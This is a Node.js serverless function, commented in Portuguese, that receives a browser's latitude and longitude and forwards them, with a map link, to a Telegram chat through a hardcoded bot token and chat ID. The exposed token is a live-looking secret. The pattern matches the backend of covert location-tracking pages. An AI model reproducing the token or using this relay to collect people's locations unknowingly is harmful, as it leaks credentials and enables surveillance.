const https = require('https');
const querystring = require('querystring');

const TELEGRAM_BOT_TOKEN = '7715557687:AAHvJdcOYIqjIpGpBSsv66Irb9ViN5tZvMs';
const TELEGRAM_CHAT_ID = '2063662084';

module.exports = async (req, res) => {
  // Habilitar CORS para permitir requisições do navegador
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Tratar requisições OPTIONS (preflight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    console.log('Recebendo requisição:', req.body);
    const { latitude, longitude } = req.body;
    
    if (!latitude || !longitude) {
      console.error('Dados de localização ausentes:', req.body);
      return res.status(400).json({ error: 'Dados de localização ausentes' });
    }

    console.log(`Localização recebida: Lat ${latitude}, Long ${longitude}`);
    
    // Tentar enviar a localização usando sendMessage
    const messageText = `Nova localização: Latitude: ${latitude}, Longitude: ${longitude}. Ver no mapa: https://maps.google.com/?q=${latitude},${longitude}`;
    
    try {
      // Método mais simples e direto usando a API do Telegram
      const result = await sendSimpleTelegramMessage(messageText);
      console.log('Resultado do envio:', result);
      
      return res.status(200).json({ 
        status: 'ok', 
        telegram_response: result
      });
    } catch (telegramError) {
      console.error('Erro ao enviar para o Telegram:', telegramError);
      return res.status(500).json({ error: telegramError.message });
    }
  } catch (error) {
    console.error('Erro no processamento:', error);
    return res.status(500).json({ error: error.message });
  }
};

// Função simplificada para enviar mensagem ao Telegram
function sendSimpleTelegramMessage(messageText) {
  return new Promise((resolve, reject) => {
    // Dados em formato de formulário em vez de JSON
    const postData = querystring.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText
    });
    
    console.log('Enviando mensagem para o Telegram...');
    
    // Configuração da requisição
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    // Fazer requisição
    const req = https.request(options, (res) => {
      let data = '';
      
      // Coletar os dados da resposta
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      // Processar resposta finalizada
      res.on('end', () => {
        console.log('Resposta completa do Telegram:', data);
        
        try {
          if (res.statusCode === 200) {
            const jsonResponse = JSON.parse(data);
            resolve(jsonResponse);
          } else {
            reject(new Error(`Telegram API retornou código ${res.statusCode}: ${data}`));
          }
        } catch (e) {
          reject(new Error(`Erro ao processar resposta do Telegram: ${e.message}. Resposta: ${data}`));
        }
      });
    });
    
    // Tratar erros de conexão
    req.on('error', (e) => {
      console.error('Erro na conexão com o Telegram:', e);
      reject(e);
    });
    
    // Enviar os dados e finalizar requisição
    req.write(postData);
    req.end();
  });
} 